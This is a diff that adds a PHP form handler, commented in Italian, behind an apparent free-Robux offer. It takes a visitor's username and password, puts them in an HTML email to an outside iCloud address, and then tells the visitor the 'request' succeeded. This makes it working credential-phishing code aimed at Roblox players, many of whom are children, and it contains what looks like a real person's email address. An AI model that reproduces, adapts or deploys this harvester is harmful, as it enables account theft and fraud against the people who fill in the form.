@@ -1,0 +1,43 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Raccogli i dati del form
+    $username = htmlspecialchars($_POST['username']);
+    $password = htmlspecialchars($_POST['password']);
+    $robux = htmlspecialchars($_POST['robux']);
+
+    // L'indirizzo email dove verranno inviate le informazioni
+    $to = "iolanda.zummo@icloud.com"; // Indirizzo email aggiornato
+
+    // Oggetto dell'email
+    $subject = "New Robux Request";
+
+    // Contenuto dell'email
+    $message = "
+    <html>
+    <head>
+        <title>New Robux Request</title>
+    </head>
+    <body>
+        <h2>Request Details</h2>
+        <p><strong>Username:</strong> $username</p>
+        <p><strong>Password:</strong> $password</p>
+        <p><strong>Selected Robux Amount:</strong> $robux</p>
+    </body>
+    </html>
+    ";
+
+    // Impostazione per inviare email in formato HTML
+    $headers = "MIME-Version: 1.0" . "\r\n";
+    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+
+    // Intestazione dell'email (From)
+    $headers .= "From: <$username@example.com>" . "\r\n";
+
+    // Invio dell'email
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Your request has been successfully sent!";
+    } else {
+        echo "There was a problem sending your request. Please try again.";
+    }
+}
+?>
